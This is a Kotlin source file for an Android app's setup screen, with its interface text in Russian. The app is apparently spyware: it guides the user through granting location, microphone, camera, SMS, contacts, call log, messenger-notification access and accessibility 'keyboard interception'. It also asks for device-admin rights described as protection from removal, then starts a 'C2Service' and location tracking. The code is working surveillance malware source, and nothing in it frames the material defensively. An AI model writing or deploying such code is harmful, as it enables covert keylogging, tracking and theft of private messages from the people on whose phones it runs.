package com.sp.core

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.app.role.RoleManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationManagerCompat
import com.sp.core.util.PermState
import com.sp.core.services.C2Service
import com.sp.core.services.LocationService
import com.sp.core.services.UsageStatsService

/**
 * Permission wizard.
 *
 * The old version was an invisible activity that fired system screens one
 * after another - with `noHistory` the activity was destroyed as soon as a
 * settings screen came on top, so the wizard restarted at step 0 and the
 * user ended up granting nothing.
 *
 * This version is a visible, guided list: every row shows whether the
 * permission is already granted and a button that opens exactly the screen
 * needed for it. The status is re-checked every time the user comes back.
 */
class SetupActivity : Activity() {

    private class Step(
        val title: String,
        val subtitle: String,
        val granted: (Context) -> Boolean,
        val action: (SetupActivity) -> Unit
    )

    private lateinit var listBox: LinearLayout
    private lateinit var summary: TextView
    private val steps = mutableListOf<Step>()
    private var pendingStep = -1

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            buildSteps()
            setContentView(buildUi())
        } catch (t: Throwable) {
            finish()
        }
    }

    override fun onResume() {
        super.onResume()
        refresh()
    }

    /* ------------------------------------------------------------------ UI */

    private fun buildUi(): View {
        val scroll = ScrollView(this)
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(22), dp(18), dp(28))
            setBackgroundColor(0xFF0B1220.toInt())
        }

        val title = TextView(this).apply {
            text = "Настройка системы"
            setTextColor(0xFFE8EEFB.toInt())
            textSize = 21f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
        }
        root.addView(title)

        val sub = TextView(this).apply {
            text = "Один раз подтвердите доступ - агент будет работать в фоне."
            setTextColor(0xFF8FA1C0.toInt())
            textSize = 13.5f
            setPadding(0, dp(6), 0, dp(14))
        }
        root.addView(sub)

        summary = TextView(this).apply {
            setTextColor(0xFF5D6E8D.toInt())
            textSize = 12.5f
            setPadding(0, 0, 0, dp(12))
        }
        root.addView(summary)

        listBox = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        root.addView(listBox)

        val start = Button(this).apply {
            text = "Запустить агент"
            setOnClickListener { startAgent() }
        }
        root.addView(start, LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
        ).apply { topMargin = dp(22) })

        scroll.addView(root)
        return scroll
    }

    private fun buildSteps() {
        steps.clear()

        // --- runtime permission groups -----------------------------------
        steps += permStep(
            "Геоданные", "GPS и интернет-определение местоположения",
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ), background = true
        )
        steps += permStep(
            "Микрофон", "Запись звука вокруг", arrayOf(Manifest.permission.RECORD_AUDIO)
        )
        steps += permStep(
            "Камера", "Снимки с фронтальной и основной камеры",
            arrayOf(Manifest.permission.CAMERA)
        )
        steps += permStep(
            "SMS", "Чтение входящих сообщений", arrayOf(
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS
            )
        )
        steps += permStep(
            "Контакты и звонки", "Список контактов и история вызовов", arrayOf(
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG
            )
        )
        steps += permStep(
            "Медиа", "Галерея: фото и видео", arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO
            )
        )
        steps += permStep(
            "Уведомления", "Показ служебного уведомления (иначе Android его блокирует)",
            arrayOf(Manifest.permission.POST_NOTIFICATIONS)
        )

        // --- settings screens --------------------------------------------
        steps += Step(
            "Специальные возможности",
            "Включить перехват клавиатуры (Accessibility)",
            { ctx -> accessibilityOn(ctx) }
        ) { act -> act.openSettings(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }

        steps += Step(
            "Служба уведомлений",
            "Читать уведомления мессенджеров",
            { ctx -> NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName) }
        ) { act -> act.openSettings(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }

        steps += Step(
            "Доступ к использованию",
            "Статистика запущенных приложений",
            { ctx -> usageAccessOn(ctx) }
        ) { act -> act.openSettings(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) }

        steps += Step(
            "Наложение поверх окон",
            "Оверлей поверх других приложений",
            { ctx -> Settings.canDrawOverlays(ctx) }
        ) { act ->
            act.openSettings(
                Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${act.packageName}"))
            )
        }

        steps += Step(
            "Установка неизвестных приложений",
            "Разрешить установку доп. модулей",
            { ctx -> unknownSourcesOn(ctx) }
        ) { act ->
            act.openSettings(
                Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:${act.packageName}"))
            )
        }

        steps += Step(
            "Оптимизация батареи",
            "Не выключать приложение - без этого система его убивает",
            { ctx -> batteryExempt(ctx) }
        ) { act ->
            act.openSettings(
                Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:${act.packageName}")
                )
            )
        }

        steps += Step(
            "Администратор устройства",
            "Защита от удаления и сброс до заводских",
            { ctx -> adminOn(ctx) }
        ) { act ->
            val admin = ComponentName(act, AdminReceiver::class.java)
            act.openSettings(
                Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                    .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            )
        }

        steps += Step(
            "Захват экрана",
            "Снимки экрана (можно включить позже)",
            { false }
        ) { act ->
            try {
                val mpm = act.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                act.startActivity(mpm.createScreenCaptureIntent())
            } catch (_: Throwable) {
            }
        }
    }

    private fun permStep(
        title: String,
        subtitle: String,
        perms: Array<String>,
        background: Boolean = false
    ): Step {
        val all = if (background && Build.VERSION.SDK_INT >= 29)
            perms + arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION) else perms
        return Step(title, subtitle, { ctx -> all.all { granted(ctx, it) } }) { act ->
            act.pendingStep = act.steps.indexOfFirst { it.title == title }
            act.requestPerms(all)
        }
    }

    private fun refresh() {
        if (!::listBox.isInitialized) return
        listBox.removeAllViews()
        var ok = 0
        steps.forEachIndexed { index, step ->
            val granted = try { step.granted(this) } catch (_: Throwable) { false }
            if (granted) ok++
            listBox.addView(buildRow(step, granted, index))
        }
        if (::summary.isInitialized) {
            summary.text = "Готово $ok / ${steps.size} - остальные можно выдать позже"
        }
    }

    private fun buildRow(step: Step, granted: Boolean, index: Int): View {
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(dp(14), dp(12), dp(12), dp(12))
            setBackgroundColor(0xFF131C2F.toInt())
            val lp = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
            )
            lp.bottomMargin = dp(9)
            layoutParams = lp
        }

        val texts = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
        }
        texts.addView(TextView(this).apply {
            text = step.title
            setTextColor(0xFFE8EEFB.toInt())
            textSize = 14.5f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
        })
        texts.addView(TextView(this).apply {
            text = step.subtitle
            setTextColor(0xFF8FA1C0.toInt())
            textSize = 12f
            setPadding(0, dp(2), 0, 0)
        })
        card.addView(texts)

        val btn = Button(this).apply {
            text = if (granted) "Готово" else "Выдать"
            isAllCaps = false
            textSize = 12.5f
            setPadding(dp(12), 0, dp(12), 0)
            if (granted) {
                isEnabled = false
                alpha = 0.55f
            } else {
                setOnClickListener { step.action(this@SetupActivity) }
            }
        }
        card.addView(btn)
        return card
    }

    /* ------------------------------------------------------- permissions */

    private fun granted(ctx: Context, perm: String): Boolean =
        ActivityCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED

    private fun requestPerms(perms: Array<String>) {
        val missing = perms.filter { !granted(this, it) }
        if (missing.isEmpty()) {
            refresh()
            return
        }
        try {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ_PERMS)
        } catch (_: Throwable) {
            refresh()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        pendingStep = -1
        refresh()
    }

    /* --------------------------------------------------------- checks */

    private fun accessibilityOn(ctx: Context): Boolean = PermState.accessibility(ctx)

    private fun usageAccessOn(ctx: Context): Boolean = PermState.usageAccess(ctx)

    private fun unknownSourcesOn(ctx: Context): Boolean = PermState.unknownSources(ctx)

    private fun batteryExempt(ctx: Context): Boolean = PermState.batteryExempt(ctx)

    private fun adminOn(ctx: Context): Boolean = PermState.deviceAdmin(ctx)

    /* ------------------------------------------------------------ misc */

    private fun openSettings(intent: Intent) {
        try {
            startActivity(intent)
        } catch (_: Throwable) {
            try {
                startActivity(Intent(Settings.ACTION_SETTINGS))
            } catch (_: Throwable) {
            }
        }
    }

    private fun startAgent() {
        try {
            val c2 = Intent(this, C2Service::class.java)
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(c2) else startService(c2)
        } catch (_: Throwable) {
        }
        try {
            val loc = Intent(this, LocationService::class.java)
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(loc) else startService(loc)
        } catch (_: Throwable) {
        }
        try {
            startService(Intent(this, UsageStatsService::class.java))
        } catch (_: Throwable) {
        }
        try {
            com.sp.core.stealth.IconHider.show(this)
        } catch (_: Throwable) {
        }
        try {
            Toast.makeText(this, "Агент запущен", Toast.LENGTH_SHORT).show()
        } catch (_: Throwable) {
        }
        finish()
    }

    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()

    companion object {
        private const val REQ_PERMS = 0x5F70
    }
}
